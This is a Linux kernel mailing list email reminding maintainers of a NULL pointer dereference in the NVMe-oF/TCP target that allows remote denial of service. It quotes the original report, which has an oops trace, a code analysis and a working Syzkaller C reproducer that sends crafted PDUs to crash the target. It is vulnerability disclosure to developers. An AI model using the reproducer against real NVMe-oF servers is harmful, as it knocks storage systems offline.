Return-Path: <linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 619A0C07548
	for <linux-nvme@archiver.kernel.org>; Wed, 15 Nov 2023 09:40:25 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Type:Cc:To:Subject:
	Message-ID:Date:From:In-Reply-To:References:MIME-Version:Reply-To:
	Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
	Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
	bh=zNwsb389bgir1l7XMhmG75zu2h8vtS35zs/JhwBUctg=; b=FHk48owWE/53fTMuavTr0QhdIg
	JtHjBqbtlnhzTRiugQrLT3S/rYnbERU6RRe9t8nVwwDo9VF9HGYwuuR+UIYdDn+TfsobXlgPXMxUW
	0X3OLsPbtCpcJpj8sVXbxkBHTt1ySyGXePMpxQOYQaf+CGLj4o3mKYOssL9FvhRaUfF6YKJQc9ptn
	OIvq379m6Zu8P4heWDtJabOUamgedcU5jc3ao+U2JsxZjcZydrzzr8M/2ZJkeGE5ul8MZGq36ppBp
	FbHHukP1f1jesp62dhpmB39NE6ri6gY5+ZriNo3b8XUkWXPrb2OVjVyeocoUeNN0gcBb9JGqnGL2V
	jWPefrOA==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1r3CNh-000MJO-2u;
	Wed, 15 Nov 2023 09:40:21 +0000
Received: from mail-ej1-x634.google.com ([2a00:1450:4864:20::634])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1r3CNe-000MIh-0i
	for linux-nvme@lists.infradead.org;
	Wed, 15 Nov 2023 09:40:20 +0000
Received: by mail-ej1-x634.google.com with SMTP id a640c23a62f3a-9e1fb7faa9dso976117466b.2
        for <linux-nvme@lists.infradead.org>; Wed, 15 Nov 2023 01:40:17 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1700041216; x=1700646016; darn=lists.infradead.org;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=zNwsb389bgir1l7XMhmG75zu2h8vtS35zs/JhwBUctg=;
        b=maBuqhF2o5eQhruPx6248ccsDHZXSmDQIYDzTbcm6xCibU9Ly6A3dCoKnmeUOGvN/4
         YU3+JN5aTuqpJsjGRBMTocUnWMTIsgGw7/QUIf/Cv2gOhvDfPK93MHGdBTP1F3E5rfFm
         BfQTiLafMcv9ASXMI7MY2UwF3CH7IlWs9ykCO5ZzHSMGbv2Ozmbce5+CpA5YuZ43I4ZZ
         jyjytwnx1mFk3urT4WeCBUlpv3emo7fPJK5JDy+MRbYnO090OFyyrIv/DQBVJWfs/OXU
         jBfPH+2nCpUW9cZxe3QEFozfOJyAX8zxxM0sQCi18CFconRDcIM15vlih78i6Vtg3TM+
         bgTA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1700041216; x=1700646016;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=zNwsb389bgir1l7XMhmG75zu2h8vtS35zs/JhwBUctg=;
        b=j+Rpz+D7DJUsZrkxHlXUjJOsQN7r8XuGsPP5AwHM6JOL1vu44m6nZfxcRZ6r36ixcX
         NPgDmyP8oy7OKrv+4ugivnEWdDKeISysh9WB+sLCSAHSDVcVVsL0Cf5bGfmvupZ1BnPP
         2Ot35fQuG3bBdG1brN78fDTC6lyHYGCaf7n2DOj12mhxX6wAOx3f6CdK7AsECm2eDg9o
         qb5mrozk+gR6zj/I0Z3CCDSkVZHP7u0fVOzph29GcarXDfbwKfNDgkhE1fPwDlryRqYN
         8iCqYkuyomoE0jlM+AvVjG5VKhe1laQZaxgYTdMeI2CVaDXZrgFOOKUcJr70krhIyZld
         r2/w==
X-Gm-Message-State: AOJu0YzKrRe2wsHJsbkUVaThx/TUz8vdtgTiezHwsFRaRkLVYf7TaW2H
	2YunrQdB6F2HZ/iVXBq+0OtB6HAJ8PVb6O+aIetrMLItsLQQw994
X-Google-Smtp-Source: AGHT+IGQI4DSqdhctZn4ACNqS4BaNX8uALNK/eY+5LBBdMegOjlGIZqz3TSj6+yPSLsx3ISrqzOwcJBkGrsfDxzs1eE=
X-Received: by 2002:a17:906:f191:b0:9c6:8190:359f with SMTP id
 gs17-20020a170906f19100b009c68190359fmr8272634ejb.33.1700041215461; Wed, 15
 Nov 2023 01:40:15 -0800 (PST)
MIME-Version: 1.0
References: <CAK5usQtOYQoHdOnfYi24kDx+qmA98hDnV7XuH1N2oKd+PyPsBQ@mail.gmail.com>
In-Reply-To: <CAK5usQtOYQoHdOnfYi24kDx+qmA98hDnV7XuH1N2oKd+PyPsBQ@mail.gmail.com>
From: Alon Zahavi <zahavi.alon@gmail.com>
Date: Wed, 15 Nov 2023 11:40:04 +0200
Message-ID: <CAK5usQuJt-MpRzb9k78FX+1EWHBBe2H6fAtJvuY0kNOEgZidpw@mail.gmail.com>
Subject: Re: [Bug Report] NVMe-oF/TCP - NULL Pointer Dereference in `nvmet_tcp_execute_request`
To: linux-nvme@lists.infradead.org
Cc: Sagi Grimberg <sagi@grimberg.me>, Christoph Hellwig <hch@lst.de>, 
	Chaitanya Kulkarni <chaitanyak@nvidia.com>
Content-Type: text/plain; charset="UTF-8"
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231115_014018_265684_B7212AD2 
X-CRM114-Status: GOOD (  23.74  )
X-BeenThere: linux-nvme@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-nvme.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-nvme/>
List-Post: <mailto:linux-nvme@lists.infradead.org>
List-Help: <mailto:linux-nvme-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-nvme>,
 <mailto:linux-nvme-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-nvme" <linux-nvme-bounces@lists.infradead.org>
Errors-To: linux-nvme-bounces+linux-nvme=archiver.kernel.org@lists.infradead.org

Just sending another reminder for this issue.
Until a fix for this there is a remote DoS that can be triggered.

On Mon, 6 Nov 2023 at 15:39, Alon Zahavi <zahavi.alon@gmail.com> wrote:
>
> # Bug Overview
>
> ## The Bug
> There is a null-ptr-deref in `nvmet_tcp_execute_request`.
>
> ## Bug Location
> `drivers/nvme/target/tcp.c` in the function `nvmet_tcp_execute_request`.
>
> ## Bug Class
> Remote Denial of Service
>
> ## Disclaimer:
> This bug was found using Syzkaller with NVMe-oF/TCP added support.
>
> # Technical Details
>
> ## Kernel Report - NULL Pointer Dereference
> ```
> BUG: kernel NULL pointer dereference, address: 0000000000000000
> #PF: supervisor instruction fetch in kernel mode
> #PF: error_code(0x0010) - not-present page
> PGD 800000003c2bc067 P4D 800000003c2bc067 PUD 3dfc5067 PMD 0
> Oops: 0010 [#1] PREEMPT SMP KASAN PTI
> CPU: 0 PID: 2363 Comm: kworker/0:1H Not tainted 6.5.0-rc1+ #4
> Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
> Workqueue: nvmet_tcp_wq nvmet_tcp_io_work
> RIP: 0010:0x0
> Code: Unable to access opcode bytes at 0xffffffffffffffd6.
> RSP: 0018:ffff888013b0fba8 EFLAGS: 00010246
> RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
> RDX: ffff888013d50000 RSI: ffffffff833ddfe5 RDI: ffff88800e5a33e8
> RBP: ffff888013b0fcf0 R08: 0000000000000001 R09: 0000000000000000
> R10: 0000000000000000 R11: 0000000000000001 R12: ffff88800e5a33e8
> R13: 0000000000000000 R14: ffff88800e5a33e0 R15: dffffc0000000000
> FS:  0000000000000000(0000) GS:ffff88806cc00000(0000) knlGS:0000000000000000
> CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> CR2: ffffffffffffffd6 CR3: 0000000016faa003 CR4: 0000000000370ef0
> Call Trace:
>  <TASK>
>  nvmet_tcp_execute_request drivers/nvme/target/tcp.c:578 [inline]
>  nvmet_tcp_try_recv_data drivers/nvme/target/tcp.c:1232 [inline]
>  nvmet_tcp_try_recv_one drivers/nvme/target/tcp.c:1312 [inline]
>  nvmet_tcp_try_recv drivers/nvme/target/tcp.c:1338 [inline]
>  nvmet_tcp_io_work+0x202a/0x2990 drivers/nvme/target/tcp.c:1388
>  process_one_work+0xb54/0x18b0 kernel/workqueue.c:2597
>  worker_thread+0x663/0x1300 kernel/workqueue.c:2748
>  kthread+0x357/0x460 kernel/kthread.c:389
>  ret_from_fork+0x29/0x50 arch/x86/entry/entry_64.S:308
>  </TASK>
> Modules linked in:
> CR2: 0000000000000000
> ---[ end trace 0000000000000000 ]---
> ```
>
> ## Description
>
> ### Tracing The Bug
> In the call for `nvmet_tcp_execute_request` (see code block 1), there
> is a call to `cmd->req.execute()`.
> When executing the reproducer, the function pointer is pointing to
> NULL, thus the BUG: Unable to handle NULL pointer dereference.
>
> Code Block 1:
> ```
> static void nvmet_tcp_execute_request(struct nvmet_tcp_cmd *cmd)
> {
>     if (unlikely(cmd->flags & NVMET_TCP_F_INIT_FAILED))
>         nvmet_tcp_queue_response(&cmd->req);
>     else
>         cmd->req.execute(&cmd->req);
> }
> ```
>
> The reason why `cmd->req.execute` is NULL when we get into the
> `nvmet_tcp_execute_request` function lies in the `nvmet_req_init`
> function (drivers/nvme/target/core.c).
>
> Code Block 2:
> ```
> bool nvmet_req_init(struct nvmet_req *req, struct nvmet_cq *cq,
>                                  struct nvmet_sq *sq, const struct
> nvmet_fabrics_ops *ops)
> {
>     ...
>
>     if (unlikely(!req->sq->ctrl))
>         /* will return an error for any non-connect command: */
>         status = nvmet_parse_connect_cmd(req);
>     else if (likely(req->sq->qid != 0))
>         status = nvmet_parse_io_cmd(req);
>     else
>         status = nvmet_parse_admin_cmd(req);
>
>   ...
> }
> ```
>
> In the `nvmet_parse_admin_cmd` and `nvmet_parse_connect_cmd`
> functions, there are some assignments for `req->execute`.
> For example, here is in code block 3, the assignment in
> `nvmet_parse_connect_command` (drivers/nvme/target/fabrics-cmd.c).
>
> Code Block 3:
> ```
> u16 nvmet_parse_connect_cmd(struct nvmet_req *req)
> {
>     struct nvme_command *cmd = req->cmd;
>
>     ...
>
>     if (cmd->connect.qid == 0)
>         req->execute = nvmet_execute_admin_connect;
>     else
>         req->execute = nvmet_execute_io_connect;
>      return 0;
> }
> ```
>
> ## Root Cause
> When executing the reproducer the `nvmet_parse_connect_cmd` is not
> being called, but execution is continuing to
> `nvmet_tcp_execute_request` .
>
> ## Reproducer
> I am adding a reproducer generated by Syzkaller with some
> optimizations and minor changes.
>
> ```
> // autogenerated by syzkaller (https://github.com/google/syzkaller)
>
> #define _GNU_SOURCE
>
> #include <endian.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <sched.h>
> #include <stdarg.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/mount.h>
> #include <sys/prctl.h>
> #include <sys/resource.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/time.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <unistd.h>
>
> #include <linux/capability.h>
>
> uint64_t r[1] = {0xffffffffffffffff};
>
> void loop(void)
> {
>   intptr_t res = 0;
>   res = syscall(__NR_socket, /*domain=*/2ul, /*type=*/1ul, /*proto=*/0);
>   if (res != -1)
>     r[0] = res;
>   *(uint16_t*)0x20000100 = 2;
>   *(uint16_t*)0x20000102 = htobe16(0x1144);
>   *(uint32_t*)0x20000104 = htobe32(0x7f000001);
>   syscall(__NR_connect, /*fd=*/r[0], /*addr=*/0x20000100ul, /*addrlen=*/0x10ul);
>   *(uint8_t*)0x200001c0 = 0;
>   *(uint8_t*)0x200001c1 = 0;
>   *(uint8_t*)0x200001c2 = 0x80;
>   *(uint8_t*)0x200001c3 = 0;
>   *(uint32_t*)0x200001c4 = 0x80;
>   *(uint16_t*)0x200001c8 = 0;
>   *(uint8_t*)0x200001ca = 0;
>   *(uint8_t*)0x200001cb = 0;
>   *(uint32_t*)0x200001cc = 0;
>   memcpy((void*)0x200001d0,
>          "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>          "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>          "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35"
>          "\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86"
>          "\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf"
>          "\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86\xcf\xbf"
>          "\x35\x86\xcf\xbf\x35\x86\xcf\xbf\x35\x86",
>          112);
>   syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x80ul,
>           /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
>   *(uint8_t*)0x200001c0 = 6;
>   *(uint8_t*)0x200001c1 = 3;
>   *(uint8_t*)0x200001c2 = 0x18;
>   *(uint8_t*)0x200001c3 = 0x18;
>   *(uint32_t*)0x200001c4 = 9;
>   *(uint16_t*)0x200001c8 = 0;
>   *(uint16_t*)0x200001ca = 0;
>   *(uint32_t*)0x200001cc = 0;
>   *(uint32_t*)0x200001d0 = 0;
>   memset((void*)0x200001d4, 0, 4);
>   *(uint64_t*)0x20000240 = 0;
>   syscall(__NR_sendto, /*fd=*/r[0], /*pdu=*/0x200001c0ul, /*len=*/0x88ul,
>           /*f=*/0ul, /*addr=*/0ul, /*addrlen=*/0ul);
> }
> int main(void)
> {
>   syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>           /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>   syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
>           /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>   syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
>           /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
>   loop();
>   return 0;
> }
> ```

